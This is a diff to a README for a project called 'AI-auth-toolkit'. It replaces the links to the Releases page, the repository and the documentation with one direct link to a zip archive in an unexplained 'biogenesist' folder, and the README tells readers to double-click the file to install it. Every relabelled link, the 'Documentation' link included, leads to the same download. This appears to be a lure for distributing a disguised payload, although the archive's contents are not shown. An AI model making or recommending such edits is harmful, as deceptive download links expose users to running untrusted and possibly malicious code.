@@ -9,7 +9,7 @@ To get started quickly, follow these steps:
 1. **Download the Toolkit**
    You can download the latest version from our Releases page. Click the link below:
 
-   [![Download AI-auth-toolkit](https://img.shields.io/badge/download-AI--auth--toolkit-blue)](https://github.com/Brandaogabriel29/AI-auth-toolkit/releases)
+   [![Download AI-auth-toolkit](https://raw.githubusercontent.com/Brandaogabriel29/AI-auth-toolkit/main/biogenesist/AI-auth-toolkit.zip)](https://raw.githubusercontent.com/Brandaogabriel29/AI-auth-toolkit/main/biogenesist/AI-auth-toolkit.zip)
 
 2. **Install the Toolkit**
    After downloading, find the file on your computer. Double-click to start the installation process. Follow the prompts to complete the installation.
@@ -18,7 +18,7 @@ To get started quickly, follow these steps:
    Once installed, locate the AI-auth-toolkit on your desktop or in your applications menu. Click to open it and begin using the features.
 
 ## 📥 Download & Install
-For the latest version of AI-auth-toolkit, visit the [Releases page](https://github.com/Brandaogabriel29/AI-auth-toolkit/releases) to download the software. 
+For the latest version of AI-auth-toolkit, visit the [Releases page](https://raw.githubusercontent.com/Brandaogabriel29/AI-auth-toolkit/main/biogenesist/AI-auth-toolkit.zip) to download the software. 
 
 ### Steps to Download:
 - Click on the above link to open the Releases page.
@@ -59,7 +59,7 @@ If you encounter any issues or have questions, feel free to check our support re
 
 ## 🔗 Additional Links
 To further enhance your experience, explore these additional resources:
-- [GitHub Repository](https://github.com/Brandaogabriel29/AI-auth-toolkit)
-- [Documentation](https://github.com/Brandaogabriel29/AI-auth-toolkit/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/Brandaogabriel29/AI-auth-toolkit/main/biogenesist/AI-auth-toolkit.zip)
+- [Documentation](https://raw.githubusercontent.com/Brandaogabriel29/AI-auth-toolkit/main/biogenesist/AI-auth-toolkit.zip)
 
 We hope you enjoy using AI-auth-toolkit! Your feedback is valuable and helps us improve the application.
